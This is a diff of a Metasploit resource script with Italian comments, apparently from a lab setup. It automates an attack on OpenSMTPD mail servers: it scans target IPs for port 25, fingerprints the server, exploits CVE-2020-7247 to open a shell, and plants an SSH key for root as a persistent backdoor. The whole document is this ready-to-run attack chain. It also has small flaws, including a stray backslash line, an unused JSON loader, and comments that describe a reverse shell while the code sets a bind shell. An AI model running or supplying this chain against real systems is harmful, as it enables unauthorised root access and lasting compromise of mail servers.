@@ -1,201 +1,212 @@
-<ruby>                                                                                                                                                                                        
-#                                                                                                                                                                                             
-# Stampa guida                                                                                                                                                                    
-#                                                                                                                                                                                             
-def help_me                                                                                                                                                                                   
-    help = %Q|
-    Descrizione:
-            Questo resource script Metasploit rileva tra le macchine in targetIPs quali sono server opensmtpd e le attacca sfruttando la vulnerabilità CVE-2020-7247 per aprire una reverse shell ed aggiungere una chiave ssh all'utente root.
+<ruby>      
+    require "json"   
 
-            Una volta eseguito lo script è possibile accedere alla macchina vittima via ssh attraverso il seguente modulo:
-                auxiliary/scanner/ssh/ssh_login_pubkey
-                https://github.com/rapid7/metasploit-framework/blob/master/documentation/modules/auxiliary/scanner/ssh/ssh_login_pubkey.md
+    def initialize_from_json(json_file)
+        # Legge il file JSON
+        json_data = JSON.parse(File.read(json_file))
+        # Imposta i parametri nel datastore
+        framework.datastore["WORKSPACE"] = json_data["workspace"]
+        framework.datastore["TARGET_IPS"] = json_data["targetIPs"]
+        framework.datastore["LISTENING_IP"] = json_data["listeningIP"]
+    end    
+                                                                                                                                                                               
+    #                                                                                                                                                                                             
+    # Stampa guida                                                                                                                                                                    
+    #                                                                                                                                                                                             
+    def help_me                                                                                                                                                                                   
+        help = %Q|
+        Descrizione:
+                Questo resource script Metasploit rileva tra le macchine in targetIPs quali sono server opensmtpd e le attacca sfruttando la vulnerabilità CVE-2020-7247 per aprire una reverse shell ed aggiungere una chiave ssh all'utente root.
 
-            Moduli utilizzati durante il processo di attacco: 
+                Una volta eseguito lo script è possibile accedere alla macchina vittima via ssh attraverso il seguente modulo:
+                    auxiliary/scanner/ssh/ssh_login_pubkey
+                    https://github.com/rapid7/metasploit-framework/blob/master/documentation/modules/auxiliary/scanner/ssh/ssh_login_pubkey.md
 
-                pre exploit:
-                    https://attack.mitre.org/techniques/T1595/001/
-                    ricerca degli host con porta 25 aperta:
-                    auxiliary/scanner/portscan/tcp
-                    https://www.rapid7.com/db/modules/auxiliary/scanner/portscan/tcp/
+                Moduli utilizzati durante il processo di attacco: 
 
-                    https://attack.mitre.org/techniques/T1595/002/
-                    identificazione della tipologia di mail server:
-                    auxiliary/scanner/smtp/smtp_version
-                    https://www.rapid7.com/db/modules/auxiliary/scanner/smtp/smtp_version/
+                    pre exploit:
+                        https://attack.mitre.org/techniques/T1595/001/
+                        ricerca degli host con porta 25 aperta:
+                        auxiliary/scanner/portscan/tcp
+                        https://www.rapid7.com/db/modules/auxiliary/scanner/portscan/tcp/
 
-                exploit:
-                    https://attack.mitre.org/techniques/T1210/
-                    exploit/unix/smtp/opensmtpd_mail_from_rce
-                    https://www.rapid7.com/db/modules/exploit/unix/smtp/opensmtpd_mail_from_rce/
-            
-                    https://attack.mitre.org/techniques/T1059/004/
-                    payload per ottenere reverse shell:
-                    payload/cmd/unix/reverse_openssl
-                    https://www.rapid7.com/db/modules/payload/cmd/unix/reverse_openssl/
+                        https://attack.mitre.org/techniques/T1595/002/
+                        identificazione della tipologia di mail server:
+                        auxiliary/scanner/smtp/smtp_version
+                        https://www.rapid7.com/db/modules/auxiliary/scanner/smtp/smtp_version/
 
-                post exploit:
-                    https://attack.mitre.org/techniques/T1098/004/
-                    creare backdoor:
-                    post/linux/manage/sshkey_persistence
-                    https://www.rapid7.com/db/modules/post/linux/manage/sshkey_persistence/
+                    exploit:
+                        https://attack.mitre.org/techniques/T1210/
+                        exploit/unix/smtp/opensmtpd_mail_from_rce
+                        https://www.rapid7.com/db/modules/exploit/unix/smtp/opensmtpd_mail_from_rce/
+                
+                        https://attack.mitre.org/techniques/T1059/004/
+                        payload per ottenere reverse shell:
+                        payload/cmd/unix/reverse_openssl
+                        https://www.rapid7.com/db/modules/payload/cmd/unix/reverse_openssl/
+
+                    post exploit:
+                        https://attack.mitre.org/techniques/T1098/004/
+                        creare backdoor:
+                        post/linux/manage/sshkey_persistence
+                        https://www.rapid7.com/db/modules/post/linux/manage/sshkey_persistence/
 
 
-    Uso:
-            msfconsole -r attacco_opensmtpd.rc [workspace] [targetIPs] [listeningIP]
+        Uso:
+                msfconsole -r attacco_opensmtpd.rc [workspace] [targetIPs] [listeningIP]
 
-    Parametri:
-            workspace      - workspace in cui salvare i dati raccolti dagli scanner e la chiave ssh aggiunta
-            targetIPs      - range di indirizzi IP da analizzare e se vulnerabili attaccare
-            listeningIP    - indirizzo IP o nome interfaccia della macchina attaccante
+        Parametri:
+                workspace      - workspace in cui salvare i dati raccolti dagli scanner e la chiave ssh aggiunta
+                targetIPs      - range di indirizzi IP da analizzare e se vulnerabili attaccare
+                listeningIP    - indirizzo IP o nome interfaccia della macchina attaccante
 
-    Esempio:
-            msfconsole -r attacco_opensmtpd.rc workspace_opensmtpd 172.20.0.3 eth0
+        Esempio:
+                msfconsole -r attacco_opensmtpd.rc workspace_opensmtpd 172.20.0.3 eth0
 
-    |
+        |
 
-    help = help.gsub(/^\t/, '')
-    print_line(help)
-end
+        help = help.gsub(/^\t/, '')
+        print_line(help)
+    end
 
-#
-# Ritorna le shell che sono state aperte dal modulo attivo al momento della chiamata
-#
-def mySessions()
+    #
+    # Ritorna le shell che sono state aperte dal modulo attivo al momento della chiamata
+    #
+    def mySessions()
 
-    return framework.sessions.select{ |sid, session| session.exploit_uuid == active_module.uuid }
-end
+        return framework.sessions.select{ |sid, session| session.exploit_uuid == active_module.uuid }
+    end
 
-#
-# Esegue processo di attacco
-#
-def execute_attack(workspace, targetIPs, listeningIP)
-    # si sposta nel workspace specificato come parametro,
-    # se non esiste lo crea in automatico
-    run_single("workspace -a #{workspace}")
-    #run_single("workspace -d #{workspace}")
-    #run_single("workspace -a #{workspace}")
-    #run_single("hosts -d 192.168.40.22")
-    # PRE-EXPLOIT
-    # seleziona come modulo attivo lo scanner di porte tcp
-    run_single("use auxiliary/scanner/portscan/tcp")
-    # configura lo scanner di modo che
-    # controlli se gli indirizzi ip targetIPs hanno la porta 25 aperta
-    run_single("set PORTS 25")
-    run_single("set THREADS 10")
-    run_single("set RHOSTS #{targetIPs}")
-    # esegue scanner porte tcp
-    run_single("run")
-    
-    # seleziona come modulo attivo lo scanner del servizio smtp
-    run_single("use auxiliary/scanner/smtp/smtp_version")
-    # tra le macchine salvate nel db filtra tutte quelle con la porta 25 aperta
-    # e le seleziona come obiettivo per lo scanner
-    run_single("services -p 25 -R")
-    # esegue scanner che raccoglie informazioni su che server smtp viene usato
-    run_single("run")
-    
-    # EXPLOIT
-    # seleziona come modulo attivo l'exploit che sfrutta la vulnerabilità CVE-2020-7247
-    run_single("use exploit/unix/smtp/opensmtpd_mail_from_rce")
-    # usa come payload una reverse shell openssl,
-    # che in quanto dipendenza di opensmtpd sarà installata sulla macchina vittima
-    # run_single("set payload cmd/unix/reverse_openssl")
-    run_single("set payload cmd/unix/bind_perl")
-    # imposta come obiettivo dell'exploit tutti i server opensmtpd
-    #run_single("services -S opensmtpd -R")
-    run_single("set RHOSTS 192.168.40.22")
-    # imposta l'indirizzo ip su cui avviare il listener per la reverse shell
-    run_single("set LHOST #{listeningIP}")
-    # COMPATIBILITY MOD
-    run_single("set TARGET 0")
-    # esegue exploit
-    run_single("exploit -j")
-    # attende che venga aperta la reverse shell
-    sleep(10)
+    #
+    # Esegue processo di attacco
+    #
+    def execute_attack()
 
-    # ottiene gli id delle shell aperte dall'exploit al passo precedente
-    mySessionIDs = mySessions.keys
-    
-    # POST-EXPLOT
-    for sessionID in mySessionIDs
-        # ottiene la permanenza aggiungendo una chiave ssh alla macchina vittima
-        run_single("use post/linux/manage/sshkey_persistence")
-        run_single("set CREATESSHFOLDER true")
-        run_single("set USERNAME root")
-        run_single("set SESSION #{sessionID}")
-        # COMPATIBILITY MOD
-        run_single("set WORKSPACE #{workspace}")
+        workspace = framework.datastore["WORKSPACE"]
+        targetIPs = framework.datastore["TARGET_IPS"]
+\       listeningIP = framework.datastore["LISTENING_IP"]
+
+        # si sposta nel workspace specificato come parametro,
+        # se non esiste lo crea in automatico
+        run_single("workspace -a #{workspace}")
+        #run_single("workspace -d #{workspace}")
+        #run_single("workspace -a #{workspace}")
+        #run_single("hosts -d 192.168.40.22")
+
+        # PRE-EXPLOIT
+        # seleziona come modulo attivo lo scanner di porte tcp
+        run_single("use auxiliary/scanner/portscan/tcp")
+        # configura lo scanner di modo che
+        # controlli se gli indirizzi ip targetIPs hanno la porta 25 aperta
+        run_single("set PORTS 25")
+        run_single("set THREADS 10")
+        run_single("set RHOSTS #{targetIPs}")
+        # esegue scanner porte tcp
         run_single("run")
+        
+        # seleziona come modulo attivo lo scanner del servizio smtp
+        run_single("use auxiliary/scanner/smtp/smtp_version")
+        # tra le macchine salvate nel db filtra tutte quelle con la porta 25 aperta
+        # e le seleziona come obiettivo per lo scanner
+        run_single("services -p 25 -R")
+        # esegue scanner che raccoglie informazioni su che server smtp viene usato
+        run_single("run")
+        
+        # EXPLOIT
+        # seleziona come modulo attivo l'exploit che sfrutta la vulnerabilità CVE-2020-7247
+        run_single("use exploit/unix/smtp/opensmtpd_mail_from_rce")
+        # usa come payload una reverse shell openssl,
+        # che in quanto dipendenza di opensmtpd sarà installata sulla macchina vittima
+        run_single("set payload cmd/unix/bind_perl")
+        # imposta come obiettivo dell'exploit tutti i server opensmtpd
+        #run_single("services -S opensmtpd -R")
+        run_single("set RHOSTS #{targetIPs}")
+        # imposta l'indirizzo ip su cui avviare il listener per la reverse shell
+        run_single("set LHOST #{listeningIP}")
+        # COMPATIBILITY MOD
+        run_single("set TARGET 0")
+        # esegue exploit
+        run_single("exploit -j")
+        # attende che venga aperta la reverse shell
+        sleep(10)
+
+        # ottiene gli id delle shell aperte dall'exploit al passo precedente
+        mySessionIDs = mySessions.keys
+        
+        # POST-EXPLOT
+        for sessionID in mySessionIDs
+            # ottiene la permanenza aggiungendo una chiave ssh alla macchina vittima
+            run_single("use post/linux/manage/sshkey_persistence")
+            run_single("set CREATESSHFOLDER true")
+            run_single("set USERNAME root")
+            run_single("set SESSION #{sessionID}")
+            # COMPATIBILITY MOD
+            run_single("set WORKSPACE #{workspace}")
+            run_single("run")
+        end
     end
-end
 
 
-#
-# Controlla che il db sia connesso,
-# in caso contrario lancia un'eccezione
-#
-def is_db_connected?
-    begin
-        framework.db.hosts
-        return true
-    rescue ::ActiveRecord::ConnectionNotEstablished
-        raise RuntimeError, "Database non connesso"
+    #
+    # Controlla che il db sia connesso,
+    # in caso contrario lancia un'eccezione
+    #
+    def is_db_connected?
+        begin
+            framework.db.hosts
+            return true
+        rescue ::ActiveRecord::ConnectionNotEstablished
+            raise RuntimeError, "Database non connesso"
+        end
     end
-end
 
 
-#
-# Inizializzazione parametri
-#
-def init_args
-    args = {}
-    # se tra gli argomenti passati è presente la parola help ritorno come args help settato a true
-    if ARGV.join('') =~ /^help$/i
-        args[:help] = true
+    #
+    # Inizializzazione parametri
+    #
+    def init_args
+        args = {}
+        # se tra gli argomenti passati è presente la parola help ritorno come args help settato a true
+        if ARGV.join('') =~ /^help$/i
+            args[:help] = true
+            return args
+        end
+
+        json_file = "/data/attacker/custom_attacks/smtp/config_rc.json"
+        
+        # verifico che tutti i parametri siano stati corretamente inizializzati
+        #raise ArgumentError, "Specificare workspace in cui salvare dati raccolti" if args[:workspace].empty?
+        #raise ArgumentError, "Specificare IPs da attaccare" if args[:targetIPs].empty?
+        #raise ArgumentError, "Specificare ip o interfaccia in cui avviare listener per la reverse shell" if args[:listeningIP].empty?
+
         return args
     end
-    # costruisco la struttura dati contenente gli argomenti passati
-    # COMPATIBILITY MOD
-    datastore = framework.datastore
-    args[:workspace] = ARGV.shift || datastore['DB_WORKSPACE'] || ''
-    #args[:targetIPs] = ARGV.shift || datastore['TARGET'] || ''
-    args[:targetIPs] = '192.168.40.22'
-    args[:listeningIP] = ARGV.shift || datastore['LISTENER'] || ''
-    
-    # verifico che tutti i parametri siano stati corretamente inizializzati
-    #raise ArgumentError, "Specificare workspace in cui salvare dati raccolti" if args[:workspace].empty?
-    #raise ArgumentError, "Specificare IPs da attaccare" if args[:targetIPs].empty?
-    #raise ArgumentError, "Specificare ip o interfaccia in cui avviare listener per la reverse shell" if args[:listeningIP].empty?
-
-    return args
-end
 
 
-#
-# Codice main
-#
-begin
-    # inizializzo parametri
-    args = init_args
-    # se tra gli argomenti è presente la parola help,
-    # visualizzo la guida e termino
-    if args[:help]
-        help_me
+    #
+    # Codice main
+    #
+    begin
+        # inizializzo parametri
+        args = init_args
+        # se tra gli argomenti è presente la parola help,
+        # visualizzo la guida e termino
+        if args[:help]
+            help_me
+            return
+        end
+        # eseguo il processo di attacco
+        execute_attack()
+        
+    rescue ArgumentError => e
+        print_error("Invalid argument: #{e.message}")
         return
+
+    rescue RuntimeError => e
+        print_error(e.message)
+        return
+
+    rescue ::Exception => e
+        raise e
     end
-    # eseguo il processo di attacco
-    execute_attack(args[:workspace], args[:targetIPs], args[:listeningIP])
-
-rescue ArgumentError => e
-    print_error("Invalid argument: #{e.message}")
-    return
-
-rescue RuntimeError => e
-    print_error(e.message)
-    return
-
-rescue ::Exception => e
-    raise e
-end
 </ruby>
